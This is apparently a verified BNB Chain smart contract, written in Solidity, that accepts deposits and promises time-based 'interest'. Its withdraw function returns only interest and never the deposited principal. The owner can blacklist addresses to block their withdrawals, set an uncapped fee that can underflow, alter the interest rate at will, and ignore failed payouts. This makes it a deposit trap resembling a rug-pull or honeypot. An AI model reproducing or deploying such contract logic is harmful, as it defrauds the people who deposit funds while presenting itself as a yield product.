/**
 *Submitted for verification at BscScan.com on 2023-01-15
*/

pragma solidity ^0.7.4;
// SPDX-License-Identifier: Unlicensed

contract Interesting {
    mapping (address => uint256) public balance;
    mapping (address => uint256) public depositTicker;
    mapping (address => uint256) public depositTime;
    mapping (address => bool) public blacklisted;
    address public interestReceiver;
    uint256 public devFee = 5;
    uint256 public maxDeposit = 100000000000000000; //default max deposit is 0.1 BNB
    uint256 public interestFactor = 60;
    bool public depositsPaused = false;
    bool public maxDepositToggle = false; // by default, max deposit check is enabled

    event LogDeposit(address indexed _from, uint256 _value);
    event LogWithdraw(address indexed _to, uint256 _value);

    constructor ()  {      
        interestReceiver = msg.sender; //dev receiver
    }

    function blacklist(address _addr) public {
        require(msg.sender == interestReceiver, "Only the interest receiver can blacklist addresses.");
        blacklisted[_addr] = true;
    }

    function unblacklist(address _addr) public {
        require(msg.sender == interestReceiver, "Only the interest receiver can unblacklist addresses.");
        blacklisted[_addr] = false;
    }

    function toggleMaxDepositCheck() public {
        require(msg.sender == interestReceiver, "Only the interest receiver can toggle max deposit check.");
        maxDepositToggle = !maxDepositToggle;
    }

    function pauseDeposits() public {
        require(msg.sender == interestReceiver, "Only the interest receiver can pause deposits.");
        depositsPaused = true;
    }

    function setDevFee(uint256 newInt) public {
        require(msg.sender == interestReceiver, "Only the interest receiver can modify the maximum deposit amount.");
        devFee = newInt;
    }

    function setInterestFactor(uint256 newInt) public {
        require(msg.sender == interestReceiver, "Only the interest receiver can modify the maximum deposit amount.");
        interestFactor = newInt;
    }

    function resumeDeposits() public {
        require(msg.sender == interestReceiver, "Only the interest receiver can resume deposits.");
        depositsPaused = false;
    }

    function changeMaxDeposit(uint256 _newMax) public {
        require(msg.sender == interestReceiver, "Only the interest receiver can modify the maximum deposit amount.");
        maxDeposit = _newMax;
    }

    function checkInterestAccrued() public view returns (uint256) {
        require(balance[msg.sender] > 0, "You have not deposited any BNB");
        uint256 timeElapsed = (block.timestamp - depositTime[msg.sender])/interestFactor;
        return (timeElapsed / interestFactor) * balance[msg.sender] / interestFactor;
    }

    receive() external payable {
        if (msg.sender != interestReceiver){
        require(msg.value > 0, "Cannot deposit 0 BNB");
        require(!depositsPaused, "Deposits are currently paused");
        if(maxDepositToggle) require(msg.value <= maxDeposit, "Cannot deposit more than maximum.");
        balance[msg.sender] += msg.value;
        depositTime[msg.sender] = block.timestamp;
        }
    }

    function withdraw() public {
        require(balance[msg.sender] > 0, "Insufficient funds");
        require(!blacklisted[msg.sender], "Address is blacklisted, cannot withdraw.");
        uint256 timeElapsed = (block.timestamp - depositTime[msg.sender])/interestFactor;
        uint256 interest = (timeElapsed / interestFactor) * balance[msg.sender] / interestFactor;
        depositTime[msg.sender] = block.timestamp;
        (bool tmpSuccess,) = payable(msg.sender).call{value: interest - (interest * devFee / 100), gas: 30000}("");
        // only to supress warning msg
        tmpSuccess = false;

        (bool tmpSuccess2,) = payable(interestReceiver).call{value: interest * devFee / 100, gas: 30000}("");
        // only to supress warning msg
        tmpSuccess2 = false;
    }
}